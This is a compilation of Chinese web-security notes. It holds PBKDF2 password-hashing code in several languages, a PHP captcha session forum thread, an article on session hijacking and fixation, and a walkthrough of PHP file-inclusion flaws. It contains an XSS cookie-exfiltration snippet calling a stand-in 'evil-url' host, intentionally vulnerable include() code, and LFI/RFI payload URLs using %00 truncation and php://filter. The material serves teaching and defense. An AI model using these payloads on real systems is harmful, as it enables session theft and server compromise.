        random.nextBytes(salt);

        // Hash the password
        byte[] hash = pbkdf2(password, salt, PBKDF2_ITERATIONS, HASH_BYTE_SIZE);
        // format iterations:salt:hash
        return PBKDF2_ITERATIONS + ":" + toHex(salt) + ":" +  toHex(hash);
    }

    /**
     * Validates a password using a hash.
     *
     * @param   password        the password to check
     * @param   correctHash     the hash of the valid password
     * @return                  true if the password is correct, false if not
     */
    public static boolean validatePassword(String password, String correctHash)
        throws NoSuchAlgorithmException, InvalidKeySpecException
    {
        return validatePassword(password.toCharArray(), correctHash);
    }

    /**
     * Validates a password using a hash.
     *
     * @param   password        the password to check
     * @param   correctHash     the hash of the valid password
     * @return                  true if the password is correct, false if not
     */
    public static boolean validatePassword(char[] password, String correctHash)
        throws NoSuchAlgorithmException, InvalidKeySpecException
    {
        // Decode the hash into its parameters
        String[] params = correctHash.split(":");
        int iterations = Integer.parseInt(params[ITERATION_INDEX]);
        byte[] salt = fromHex(params[SALT_INDEX]);
        byte[] hash = fromHex(params[PBKDF2_INDEX]);
        // Compute the hash of the provided password, using the same salt, 
        // iteration count, and hash length
        byte[] testHash = pbkdf2(password, salt, iterations, hash.length);
        // Compare the hashes in constant time. The password is correct if
        // both hashes match.
        return slowEquals(hash, testHash);
    }

    /**
     * Compares two byte arrays in length-constant time. This comparison method
     * is used so that password hashes cannot be extracted from an on-line 
     * system using a timing attack and then attacked off-line.
     * 
     * @param   a       the first byte array
     * @param   b       the second byte array 
     * @return          true if both byte arrays are the same, false if not
     */
    private static boolean slowEquals(byte[] a, byte[] b)
    {
        int diff = a.length ^ b.length;
        for(int i = 0; i < a.length && i < b.length; i++)
            diff |= a[i] ^ b[i];
        return diff == 0;
    }

    /**
     *  Computes the PBKDF2 hash of a password.
     *
     * @param   password    the password to hash.
     * @param   salt        the salt
     * @param   iterations  the iteration count (slowness factor)
     * @param   bytes       the length of the hash to compute in bytes
     * @return              the PBDKF2 hash of the password
     */
    private static byte[] pbkdf2(char[] password, byte[] salt, int iterations, int bytes)
        throws NoSuchAlgorithmException, InvalidKeySpecException
    {
        PBEKeySpec spec = new PBEKeySpec(password, salt, iterations, bytes * 8);
        SecretKeyFactory skf = SecretKeyFactory.getInstance(PBKDF2_ALGORITHM);
        return skf.generateSecret(spec).getEncoded();
    }

    /**
     * Converts a string of hexadecimal characters into a byte array.
     *
     * @param   hex         the hex string
     * @return              the hex string decoded into a byte array
     */
    private static byte[] fromHex(String hex)
    {
        byte[] binary = new byte[hex.length() / 2];
        for(int i = 0; i < binary.length; i++)
        {
            binary[i] = (byte)Integer.parseInt(hex.substring(2*i, 2*i+2), 16);
        }
        return binary;
    }

    /**
     * Converts a byte array into a hexadecimal string.
     *
     * @param   array       the byte array to convert
     * @return              a length*2 character string encoding the byte array
     */
    private static String toHex(byte[] array)
    {
        BigInteger bi = new BigInteger(1, array);
        String hex = bi.toString(16);
        int paddingLength = (array.length * 2) - hex.length();
        if(paddingLength > 0)
            return String.format("%0" + paddingLength + "d", 0) + hex;
        else
            return hex;
    }

    /**
     * Tests the basic functionality of the PasswordHash class
     *
     * @param   args        ignored
     */
    public static void main(String[] args)
    {
        try
        {
            // Print out 10 hashes
            for(int i = 0; i < 10; i++)
                System.out.println(PasswordHash.createHash("p\r\nassw0Rd!"));

            // Test password validation
            boolean failure = false;
            System.out.println("Running tests...");
            for(int i = 0; i < 100; i++)
            {
                String password = ""+i;
                String hash = createHash(password);
                String secondHash = createHash(password);
                if(hash.equals(secondHash)) {
                    System.out.println("FAILURE: TWO HASHES ARE EQUAL!");
                    failure = true;
                }
                String wrongPassword = ""+(i+1);
                if(validatePassword(wrongPassword, hash)) {
                    System.out.println("FAILURE: WRONG PASSWORD ACCEPTED!");
                    failure = true;
                }
                if(!validatePassword(password, hash)) {
                    System.out.println("FAILURE: GOOD PASSWORD NOT ACCEPTED!");
                    failure = true;
                }
            }
            if(failure)
                System.out.println("TESTS FAILED!");
            else
                System.out.println("TESTS PASSED!");
        }
        catch(Exception ex)
        {
            System.out.println("ERROR: " + ex);
        }
    }

}
ASP.NET (C#)密码hash代码
代码下载

/* 
 * Password Hashing With PBKDF2 (http://crackstation.net/hashing-security.htm).
 * Copyright (c) 2013, Taylor Hornby
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without 
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, 
 * this list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 * this list of conditions and the following disclaimer in the documentation 
 * and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" 
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE 
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE 
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE 
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF 
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS 
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN 
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
 * POSSIBILITY OF SUCH DAMAGE.
 */

using System;
using System.Text;
using System.Security.Cryptography;

namespace PasswordHash
{
    /// <summary>
    /// Salted password hashing with PBKDF2-SHA1.
    /// Author: havoc AT defuse.ca
    /// www: http://crackstation.net/hashing-security.htm
    /// Compatibility: .NET 3.0 and later.
    /// </summary>
    public class PasswordHash
    {
        // The following constants may be changed without breaking existing hashes.
        public const int SALT_BYTE_SIZE = 24;
        public const int HASH_BYTE_SIZE = 24;
        public const int PBKDF2_ITERATIONS = 1000;

        public const int ITERATION_INDEX = 0;
        public const int SALT_INDEX = 1;
        public const int PBKDF2_INDEX = 2;

        /// <summary>
        /// Creates a salted PBKDF2 hash of the password.
        /// </summary>
        /// <param name="password">The password to hash.</param>
        /// <returns>The hash of the password.</returns>
        public static string CreateHash(string password)
        {
            // Generate a random salt
            RNGCryptoServiceProvider csprng = new RNGCryptoServiceProvider();
            byte[] salt = new byte[SALT_BYTE_SIZE];
            csprng.GetBytes(salt);

            // Hash the password and encode the parameters
            byte[] hash = PBKDF2(password, salt, PBKDF2_ITERATIONS, HASH_BYTE_SIZE);
            return PBKDF2_ITERATIONS + ":" +
                Convert.ToBase64String(salt) + ":" +
                Convert.ToBase64String(hash);
        }

        /// <summary>
        /// Validates a password given a hash of the correct one.
        /// </summary>
        /// <param name="password">The password to check.</param>
        /// <param name="correctHash">A hash of the correct password.</param>
        /// <returns>True if the password is correct. False otherwise.</returns>
        public static bool ValidatePassword(string password, string correctHash)
        {
            // Extract the parameters from the hash
            char[] delimiter = { ':' };
            string[] split = correctHash.Split(delimiter);
            int iterations = Int32.Parse(split[ITERATION_INDEX]);
            byte[] salt = Convert.FromBase64String(split[SALT_INDEX]);
            byte[] hash = Convert.FromBase64String(split[PBKDF2_INDEX]);

            byte[] testHash = PBKDF2(password, salt, iterations, hash.Length);
            return SlowEquals(hash, testHash);
        }

        /// <summary>
        /// Compares two byte arrays in length-constant time. This comparison
        /// method is used so that password hashes cannot be extracted from
        /// on-line systems using a timing attack and then attacked off-line.
        /// </summary>
        /// <param name="a">The first byte array.</param>
        /// <param name="b">The second byte array.</param>
        /// <returns>True if both byte arrays are equal. False otherwise.</returns>
        private static bool SlowEquals(byte[] a, byte[] b)
        {
            uint diff = (uint)a.Length ^ (uint)b.Length;
            for (int i = 0; i < a.Length && i < b.Length; i++)
                diff |= (uint)(a[i] ^ b[i]);
            return diff == 0;
        }

        /// <summary>
        /// Computes the PBKDF2-SHA1 hash of a password.
        /// </summary>
        /// <param name="password">The password to hash.</param>
        /// <param name="salt">The salt.</param>
        /// <param name="iterations">The PBKDF2 iteration count.</param>
        /// <param name="outputBytes">The length of the hash to generate, in bytes.</param>
        /// <returns>A hash of the password.</returns>
        private static byte[] PBKDF2(string password, byte[] salt, int iterations, int outputBytes)
        {
            Rfc2898DeriveBytes pbkdf2 = new Rfc2898DeriveBytes(password, salt);
            pbkdf2.IterationCount = iterations;
            return pbkdf2.GetBytes(outputBytes);
        }
    }
}
Ruby (on Rails) 密码hash代码
代码下载

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
# Password Hashing With PBKDF2 (http://crackstation.net/hashing-security.htm).
# Copyright (c) 2013, Taylor Hornby
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without 
# modification, are permitted provided that the following conditions are met:
# 
# 1. Redistributions of source code must retain the above copyright notice, 
# this list of conditions and the following disclaimer.
# 
# 2. Redistributions in binary form must reproduce the above copyright notice,
# this list of conditions and the following disclaimer in the documentation 
# and/or other materials provided with the distribution.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" 
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE 
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE 
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE 
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF 
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS 
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN 
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
# POSSIBILITY OF SUCH DAMAGE.
 
require 'securerandom'
require 'openssl'
require 'base64'
 
# Salted password hashing with PBKDF2-SHA1.
# Authors: @RedragonX (dicesoft.net), havoc AT defuse.ca 
# www: http://crackstation.net/hashing-security.htm
module PasswordHash
 
  # The following constants can be changed without breaking existing hashes.
  PBKDF2_ITERATIONS = 1000
  SALT_BYTE_SIZE = 24
  HASH_BYTE_SIZE = 24
 
  HASH_SECTIONS = 4
  SECTION_DELIMITER = ':'
  ITERATIONS_INDEX = 1
  SALT_INDEX = 2
  HASH_INDEX = 3
 
  # Returns a salted PBKDF2 hash of the password.
  def self.createHash( password )
    salt = SecureRandom.base64( SALT_BYTE_SIZE )
    pbkdf2 = OpenSSL::PKCS5::pbkdf2_hmac_sha1(
      password,
      salt,
      PBKDF2_ITERATIONS,
      HASH_BYTE_SIZE
    )
    return ["sha1", PBKDF2_ITERATIONS, salt, Base64.encode64( pbkdf2 )].join( SECTION_DELIMITER )
  end
 
  # Checks if a password is correct given a hash of the correct one.
  # correctHash must be a hash string generated with createHash.
  def self.validatePassword( password, correctHash )
    params = correctHash.split( SECTION_DELIMITER )
    return false if params.length != HASH_SECTIONS
 
    pbkdf2 = Base64.decode64( params[HASH_INDEX] )
    testHash = OpenSSL::PKCS5::pbkdf2_hmac_sha1(
      password,
      params[SALT_INDEX],
      params[ITERATIONS_INDEX].to_i,
      pbkdf2.length
    )
 
    return pbkdf2 == testHash
  end
 
  # Run tests to ensure the module is functioning properly.
  # Returns true if all tests succeed, false if not.
  def self.runSelfTests
    puts "Sample hashes:"
    3.times { puts createHash("password") }
 
    puts "\nRunning self tests..."
    @@allPass = true
 
    correctPassword = 'aaaaaaaaaa'
    wrongPassword = 'aaaaaaaaab'
    hash = createHash(correctPassword)
 
    assert( validatePassword( correctPassword, hash ) == true, "correct password" )
    assert( validatePassword( wrongPassword, hash ) == false, "wrong password" )
 
    h1 = hash.split( SECTION_DELIMITER )
    h2 = createHash( correctPassword ).split( SECTION_DELIMITER )
    assert( h1[HASH_INDEX] != h2[HASH_INDEX], "different hashes" )
    assert( h1[SALT_INDEX] != h2[SALT_INDEX], "different salt" )
 
    if @@allPass
      puts "*** ALL TESTS PASS ***"
    else
      puts "*** FAILURES ***"
    end
 
    return @@allPass
  end
 
  def self.assert( truth, msg )
    if truth
      puts "PASS [#{msg}]"
    else
      puts "FAIL [#{msg}]"
      @@allPass = false
    end
  end
 
end
 
PasswordHash.runSelfTests
```

### 验证码 Session 问题
```
php验证码类 session问题
原创2016-06-23 14:23:240163
widht = $widht; $this->height = $height; $this->codenum = $codenum; } function showcode() { $this->createcode();//创建画布 $this->createstring();//创建字符串 $this->createimage();//生成图像 } private function createcode()//创建画布 { $this->image = imagecreate($this->widht,$this->height); $backcolor = imagecolorallocate($this->image,255,255,255);//如需改变背景色请设置这里的RGB imagefill($this->image,0,0,$backcolor); if($this->bg == true) { $bg = imagecolorallocate($this->image,221,221,221); for($i = 0; $i < $this->widht / 2;$i++)//画竖线底纹 { imageline($this->image,$i*2,0,$i*2,$this->height,$bg); } for($i = 0;$i < $this->height / 3;$i++)//画横向底纹 { imageline($this->image,0,$i*3,$this->widht,$i*3,$bg); } } } private function createstring()//在画布写入字符串 { $string = $this->codestring(); session_start(); $_SESSION["vericode"] = $string; for($i = 0;$i < $this->codenum;$i++) { if($this->randttf == true) { $ttf = 'ttfs/t'.rand(1,9).'.ttf';//随机字体 请保证 ttfs文件夹 在同一目录里中，如改变路径请改变此路径 }else { $ttf = 'ttfs/t1.ttf';//9中字体请自己常识，只需要修改t4中数字 1 - 9看看到每种字体的效果，选择自己喜欢的 注：请关掉随机字体测试 } $fontsize = rand(14,15);//产生随机字体大小 $fontangle = rand(-10,10);//字符倾斜角度 随即倾斜 $x = $i*12+4; $y =rand($fontsize,$this->height-8); if($this->randcolor == true) { $textcolor = imagecolorallocate($this->image,rand(0,180),rand(0,180),rand(0,180)); }else { $textcolor = imagecolorallocate($this->image,0,0,0); } imagettftext($this->image,$fontsize,$fontangle,$x,$y,$textcolor,$ttf,$string[$i]); } } private function codestring()//生成随机字符串 { $string = ''; for($i=0;$i < $this->codenum;$i++) { $num = rand(1,1); /* * 如果想是单一的格式,请参考： * * 只要需要数字 * * 把上边的 $num = rand(1,3) 改成 $num = rand(2,2) * * 只需要小写字母 * * 把上边的 $num = rand(1,3) 改成 $num = rand(3,3) * * 只需要大写字母 * * 把上边的 $num = rand(1,3) 改成 $num = rand(1,1) * * 只需要 小写字母 和 数字 * * 把上边的 $num = rand(1,3) 改成 $num = rand(3,2) * */ switch($num) { case 1: $num2 = rand(65,90); //随机产生小写字母 a - z 所对应的ASCII码的值 break; case 2: $num2 = rand(51,57); //随机产生数字 2 9 所对应的ASCII码的值 如果是rand(48,57):0-9将有0 这样不利于用户判断 break; case 3: $num2 = rand(97,122); //随机产生大写字母 A - Z 所对应的ASCII码的值 break; } /* *为用用户着想去除了 0 o I i 1 z Z 2 * */ if($num2 == 111 || $num == 105 || $num == 122 || $num2 == 79 || $num2 == 73 || $num == 90)//如果是大写字母中的O,I用P代替 { $num2 = 112; } $tmp = sprintf("%c",$num2); //用sprintf函数来得到产生ASCII码所对应的字符 $string .=$tmp; } return $string; } private function createimage()//生成图像 { if(function_exists("imagegif")) { header("Content-type:image/gif"); imagegif($this->image); }elseif(function_exists("imagejpeg")) { header("Content-type:image/jpeg"); imagejpeg($this->image,"",50);//50为图像的品质，0-100 0质量最差，图像文件越小 100质量最好，图像文件越大 }elseif(function_exists("imagepng")) { header("Content-type:image/png"); imagepng($this->image); }elseif(function_exists("imagewbmp")) { header("Content-type:image/vnd.wap.wbmp"); imagewbmp($this->image); }else { die('服务器不支持图像，请检查GD库'); } } function __destruct() { imagedestroy($this->image); } }?>

上边的是验证码类

下边是用来测试页面

showcode(); if(strtoupper($_GET["code"]) != $_SESSION["vericode"] ) { echo '验证码输入错误'; }else { echo '验证码正确'; }?>

我在类中已经讲 验证码字符串赋值给了 $_SESSION['vericode'] 但是我在页面测试的时候获取不到 打印session数组也无结果 求解

回复讨论(解决方案)
太长了, 没看.

请问, 表单页面和验证码页面是否处于不同二级域名下?

你下面那段测试代码的逻辑有问题

PHP code


/*
*类名：验证码类
*功能：通过该类的对象可以获取验证码图片，和验证码字符集($_SESSION['vericode'])
*作者：小A、
*时间：2012-7-3
*/
final class VeriCode
{
private $width;……

没有二级域名， 我大概说下，我是在 验证码类中直接赋值给$_SESSION的，但是在其他页面的我得不到我在类里边赋值的SESSION

太长了, 没看.

请问, 表单页面和验证码页面是否处于不同二级域名下?
没有二级域名， 我大概说下，我是在 验证码类中直接赋值给$_SESSION的，但是在其他页面的我得不到我在类里边赋值的SESSION

其他页面 session_start(); 了吗？

没初始化类的缘故吧
function __construct($widht=60,$height=30,$codenum=4)

session_start();

php简单验证码类（字母+数字）
http://3aj.cn/php/27.html

https://www.php.cn/php-weizijiaocheng-264588.html
```

### 安全的 Session ID （让即使拦截后，也无法模拟使用）
```
https://zhuanlan.zhihu.com/p/95276068
一、概述
对于Web应用程序来说，加强安全性的第一条原则就是——不要信任来自客户端的数据，一定要进行数据验证以及过滤才能在程序中使用，进而保存到数据层。然而，由于Http的无状态性，为了维持来自同一个用户的不同请求之间的状态，客户端必须发送一个唯一的身份标识符（Session ID）来表明自己的身份。很显然，这与前面提到的安全原则是相违背的，但是没有办法，为了维持状态，我们别无选择，这也导致了Session在web应用程序中是十分脆弱的一个环节。

由于PHP内置的Session管理机制并没有提供安全处理，所以，开发人员需要建立相应的安全机制来防范会话攻击。针对Session的攻击手段主要有会话劫持（Session hijacking）和会话固定（Session fixation）两种。



二、会话劫持（Session hijacking）
会话劫持（Session hijacking），这是一种通过获取用户Session ID后，使用该Session ID登录目标账号的攻击方法，此时攻击者实际上是使用了目标账户的有效Session。会话劫持的第一步是取得一个合法的会话标识来伪装成合法用户，因此需要保证会话标识不被泄漏。

攻击步骤：
目标用户需要先登录站点；
登录成功后，该用户会得到站点提供的一个会话标识SessionID；
攻击者通过某种攻击手段捕获Session ID；
攻击者通过捕获到的Session ID访问站点即可获得目标用户合法会话。

攻击者获取SessionID的方式有多种：
暴力破解：尝试各种Session ID，直到破解为止；
预测：如果Session ID使用非随机的方式产生，那么就有可能计算出来；
窃取：使用网络嗅探，XSS攻击等方法获得。
PHP内部Session的实现机制虽然不是很安全，但是关于生成SessionID的环节还是比较安全的，这个随机的SessionID往往是极其复杂的并且难于被预测出来，所以，对于第一、第二种攻击方式基本上是不太可能成功的。

在第三种攻击方式中，针对网络嗅探攻击，是通过捕获网络通信数据得到SessionID的，这种攻击可以通过SSL避免。本文主要分析的是应用层面的攻击方式及其防御方法。

目前有三种广泛使用的在Web环境中维护会话（传递SessionID）的方法：URL参数，隐藏域和Cookie。其中每一种都各有利弊，Cookie已经被证明是三种方法中最方便最安全的。从安全的观点，如果不是全部也是绝大多数针对基于Cookie的会话管理机制的攻击对于URL或是隐藏域机制同样适用，但是反过来却不一定，这就让Cookie成为从安全考虑的最佳选择。

使用Cookie而产生的一个风险是用户的Cookie会被攻击者所盗窃。如果Session ID保存在Cookie中，Cookie的暴露就是一个严重的风险，因为它能导致会话劫持。

最基本的Cookie窃取方式：XSS漏洞。

一旦站点中存在可利用的XSS漏洞，攻击者可直接利用注入的JS脚本获取Cookie，进而通过异步请求把存有Session ID的Cookie上报给攻击者。

var img = document.createElement('img');
img.src = 'http://evil-url?c=' +encodeURIComponent(document.cookie);
document.getElementsByTagName('body')[0].appendChild(img);
如何寻找XSS漏洞是另外一个话题了，这里不详细讨论。防御上可以设置Cookie的HttpOnly属性，一旦一个Cookie被设置为HttpOnly，JS脚本就无法再获取到，而网络传输时依然会带上，也就是说依然可以依靠这个Cookie进行Session维持，但客户端JS对其不可见。那么即使存在XSS漏洞也无法简单的利用其进行Session劫持攻击了。但是上面说的是无法利用XSS进行简单的攻击，但是也不是没有办法的。既然无法使用document.cookie获取到，可以转而通过其他的方式。

下面介绍一种XSS结合其他漏洞的攻击方式。
利用PHP开发的应用会有一个phpinfo页面。而这个页面会dump出请求信息，其中就包括Cookie信息。

如果开发者没有关闭这个页面，就可以利用XSS漏洞向这个页面发起异步请求，获取到页面内容后Parse出Cookie信息，然后上传给攻击者。phpinfo只是大家最常见的一种dump请求的页面，但不仅限于此，为了调试方便，任何dump请求的页面都是可以被利用的漏洞。防御上是关闭所有phpinfo类dump request信息的页面。

防御方法：
更改Session名称。PHP中Session的默认名称是PHPSESSID，此变量会保存在Cookie中，如果攻击者不分析站点，就不能猜到Session名称，阻挡部分攻击。
关闭透明化SessionID。透明化SessionID指当浏览器中的Http请求没有使用Cookie来存放Session ID时，Session ID则使用URL来传递。
设置HttpOnly。通过设置Cookie的HttpOnly为true，可以防止客户端脚本访问这个Cookie，从而有效的防止XSS攻击。
关闭所有phpinfo类dump request信息的页面。
使用User-Agent检测请求的一致性。但有专家警告不要依赖于检查User-Agent的一致性。这是因为服务器群集中的HTTP代理服务器会对User-Agent进行编辑，而本群集中的多个代理服务器在编辑该值时可能会不一致。

加入Token校验。同样是用于检测请求的一致性，给攻击者制造一些麻烦，使攻击者即使获取了Session ID，也无法进行破坏，能够减少对系统造成的损失。但Token需要存放在客户端，如果攻击者有办法获取到Session ID，那么也同样可以获取到Token。

三、 会话固定（Session fixation）

会话固定（Session fixation）是一种诱骗受害者使用攻击者指定的会话标识（SessionID）的攻击手段。这是攻击者获取合法会话标识的最简单的方法。会话固定也可以看成是会话劫持的一种类型，原因是会话固定的攻击的主要目的同样是获得目标用户的合法会话，不过会话固定还可以是强迫受害者使用攻击者设定的一个有效会话，以此来获得用户的敏感信息。

攻击步骤：
攻击者通过某种手段重置目标用户的SessionID，然后监听用户会话状态；
目标用户携带攻击者设定的Session ID登录站点；
攻击者通过Session ID获得合法会话。

攻击者重置SessionID的方式：
重置Session ID的方法同样也有多种，可以是跨站脚本攻击，如果是URL传递Session ID，还可以通过诱导的方式重置该参数，比如可以通过邮件的方式诱导用户去点击重置Session ID的URL，使用Cookie传递可以避免这种攻击。

使用Cookie来存放SessionID，攻击者可以在以下三种可用的方法中选择一种来重置Session ID。1、使用客户端脚本来设置Cookie到浏览器。大多数浏览器都支持用客户端脚本来设置Cookie的，例如document.cookie=”sessionid=123”，这种方式可以采用跨站脚本攻击来达到目的。防御方式可以是设置HttpOnly属性，但有少数低版本浏览器存在漏洞，即使设置了HttpOnly，也可以重写Cookie。所以还需要加其他方式的校验，如User-Agent验证，Token校验等同样有效。

2、 使用HTML的<META>标签加Set-Cookie属性。服务器可以靠在返回的HTML文档中增加<META>标签来设置Cookie。例如<meta http-equiv=Set-Cookiecontent=”sessionid=123”>，与客户端脚本相比，对<META>标签的处理目前还不能被浏览器禁止。

3、使用Set-Cookie的HTTP响应头部设置Cookie。攻击者可以使用一些方法在Web服务器的响应中加入Set-Cookie的HTTP响应头部。如会话收养，闯入目标服务器所在域的任一主机，或者是攻击用户的DNS服务器。

这里还有一点需要注意，攻击者如果持有的是有效的SessionID，那么防御措施就一定得校验验证。如攻击者可以先到目标站点登录，获得有效的Session ID，然后再拿这个Session ID去重置目标用户的会话标识，那么这时候用户将会在不知情的情况下访问攻击者设定的合法会话（实际上登录的是攻击者的账号了）中，从而攻击者将有可能获取到目标用户的敏感信息。

防御方法：
用户登录时生成新的SessionID。如果攻击者使用的会话标识符不是有效的，那么这种方式将会非常有效。如果不是有效的会话标识符，服务器将会要求用户重新登录。如果攻击者使用的是有效的Session ID，那么还可以通过校验的方式来避免攻击。
大部分防止会话劫持的方法对会话固定攻击同样有效。如设置HttpOnly，关闭透明化Session ID，User-Agent验证，Token校验等。
```

### 目录权限安全
```
https://www.cnblogs.com/ghjbk/p/6757749.html
1.为每个主机配置增加一个 fastcgi_param  PHP_VALUE  "open_basedir=$document_root:/tmp/";  或是直接把这句话放到fastcgi.conf中.写在第一行或是最后一行都可以. 可以防止跨域攻击2.或是更管用的办法. 直接 打开php.ini

[HOST=域名]
open_basedir=限制目录:/tmp:/proc

这种方式更简便.

1.为每个主机配置增加一个 fastcgi_param  PHP_VALUE  "open_basedir=$document_root:/tmp/";  或是直接把这句话放到fastcgi.conf中.写在第一行或是最后一行都可以. 可以防止跨域攻击2.或是更管用的办法. 直接 打开php.ini

[HOST=域名]
open_basedir=限制目录:/tmp:/proc

这种方式更简便.
https://segmentfault.com/a/1190000018373387
```
### 包含本地与远程文件
```
https://blog.51cto.com/tdcqvip/1958654
文件包含漏洞介绍：



  程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP中居多,而在JSP、ASP、ASP.NET程序中却非常少，甚至没有，这是有些语言设计的弊端。在PHP中经常出现包含漏洞，但这并不意味这其他语言不存在。





漏洞成因：



  文件包含漏洞的产生原因是在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就 可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就形成的本地文件包含漏洞，被包涵的文件在第三方服务是，就形成了远程文件包 含漏洞。





漏洞危害：



    执行恶意代码、包含恶意文件控制网站、甚至控制网站服务器等。



本地包含漏洞：



代码：

<?PHP

$file=@$_GET['name'];

if($file){
	include $file;
}

?>
    

以以上这个代码为例：



访问：http://127.0.0.1/fileupload/include.php?name=1.txt



txt文件代码为：

<?php

phpinfo();

?>


我们可以看到txt文件里的内容以php文件的方式执行了；如下图所示：

wKiom1mdGyWDvKAjAAB9cHenV-0609.png





再看，如果访问：http://127.0.0.1/fileupload/include.php?name=2.jpg

2.jpg是一个图片的一句话木马；

wKioL1mdHS6hluOdAAASw4-kQdQ070.png-wh_50



用菜刀可以直接连接，也就是说不管后缀是什么样，最后都会以php的形式执行。



但是有时候会这样，这个在ISCC国赛中遇到了，就是在最后会自动加入.php,非常烦人。



代码2：

<?php
    Include  $_GET['page'].".php"
?>


执行结果如下图：

wKioL1mdJBmBc5u6AABo5WvNZ28269.png-wh_50



如果访问：http://127.0.0.1/fileupload/include2.php?page=1.txt



还是报错。



wKiom1mdJYCDlsCEAABQC659A7c814.png-wh_50

解决办法：%00截断

利用环境：php版本<5.3magic_quotes_gpc取消的（magic_quotes_gpc = off）





访问：http://127.0.0.1/fileupload/include2.php?page=1.txt%00



wKioL1mdJcXzg_hBAAB0G2GPapw630.png





远程包含：



  远程的文件名不能为php可解析的扩展名(php、php5..)，而且php.ini中allow_url_fopen和allow_url_include为On才可以。





访问：http://127.0.0.1/fileupload/include.php?name=http://127.0.0.1/1.txt



wKioL1mdJtnjcJOkAACPnjdVwdM034.png-wh_50







如果是遇到这种情况：

wKiom1mdJz-R4oI_AABJe51vBaA471.png可以用“？”或者“%00”阶段；

http://127.0.0.1/fileupload/include2.php?page=http://127.0.0.1/1.txt?





读取源码：php://filter/read=convert.base64-encode/resource=1.txt



http://127.0.0.1/fileupload/include.php?name=php://filter/read=convert.base64-encode/resource=1.txt



读取出来的是base64编码的，进行解码就行了。

wKiom1mdKCvBXXhkAAAezxXZmDI531.png-wh_50



php://input的用法

php://input
1.png



伪协议绕过大小写：

<?php
    
    if(isset($_GET['f'])){
        if(strpos($_GET['f'],"php") !== False){
            die("error...");
        }
        else{
            include($_GET['f'] . '.php');
        }
    }
    
?>
http://127.0.0.1//index.php?f=pHP://filter/read=convert.base64-encode/resource=index



readfile读取文件，不可以getshell

<?php
	
	 @readfile($_GET["file"]);
?>
总结：这些在iscc的国赛赛中出现过，如果当时会阶段或者会读取源码，也就能获奖了，学无止境，加油吧。

```

### 文件上传 PHP 脚本
```
https://www.php.cn/php-weizijiaocheng-342688.html
漏洞细节:
这个漏洞存在于php中一个非常常用的函数中：move_uploaded_files，开发者总是用这个函数来移动 上传 的文件,这个函数会检查被上传的文件是否是一个合法的文件(是否是通过 HTTP 的 post 机制上传的)，如果是合法的文件，则将它一定到指定目录中。

例子：

move_uploaded_file ( string $filename , string $destination )这里的问题是，可以在文件名中插入空字符(之前多次修复过这个漏洞，比如CVE-2006-7243) ，利用插入空字符的方式，攻击者可以上传任意文件，引起远程代码执行漏洞等。

我这里用DVWA来演示这个例子，DVWA级别最高的一题中因为种种原因不是很容易通过，意在告诉开发者如何去开发更 安全 的文件上传组件。让我们来看看这个例子：

代码片段：

$uploaded_name = $_FILES['uploaded']['name'];
$uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, '.') + 1); $uploaded_size = $_FILES['uploaded']['size'];
if (($uploaded_ext == "jpg" || $uploaded_ext == "JPG" || $uploaded_ext == "jpeg" || $uploaded_ext == "JPEG") && ($uploaded_size < 100000)){ if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {
$html .= '';
$html .= 'Your image was not uploaded.';
$html .= ''; }
else {
